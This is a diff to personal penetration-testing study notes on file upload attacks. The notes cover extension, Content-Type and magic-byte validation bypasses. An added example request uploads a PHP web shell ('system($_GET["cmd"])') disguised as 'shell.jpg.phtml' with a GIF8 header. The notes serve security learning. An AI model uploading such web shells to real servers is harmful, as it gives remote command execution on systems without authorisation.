@@ -1,5 +1,9 @@
 #CWES 
 
+
+#### Lessons:
+- When bypassing different filter types, be systematical, and have good wordlists (example have wordlist on double extentions, filter-bypass,etc)
+
 #### Cause of file upload attacks:
 - Weak file validation and verification - bad logic in code or outdated libraries 
 
@@ -74,3 +78,31 @@ We also might be able do some character injection into the extension
 - `:`
 
 Which can be mixed with the extension to bypass. Consider building a wordlist with such characters and known extensions. 
+
+**File content validation:**
+- It is not enough to validate the file extension, optimally the content is also validated.  
+- the developer can use "content-type" to describe what content it wants, but this is also in the control of the client and can be changed 
+
+So we can send Content-Type: image/jpg , but send a php file.
+
+- Another way to validate the file content is to use MIME-Type, which are "magic bytes" which indicates a filetype. Ex. if the file starts with "GID8", "GIF87a" or "GIF89a" it is considered a .gif file. 
+
+So we can add such string at the start of our payload.  Example:
+```
+.....
+
+------geckoformboundary41ea713db43d71e6c99f699cf7006d8f
+Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.phtml"
+Content-Type: image/gif
+
+GIF8
+<?php system($_GET["cmd"]); ?>
+------geckoformboundary41ea713db43d71e6c99f699cf7006d8f--
+
+```
+
+- We have a fileextention bypass
+- We have a Content-Type bypass
+- We have a MiME type bypass
+
+Be structured, and test them in isolated cases. 
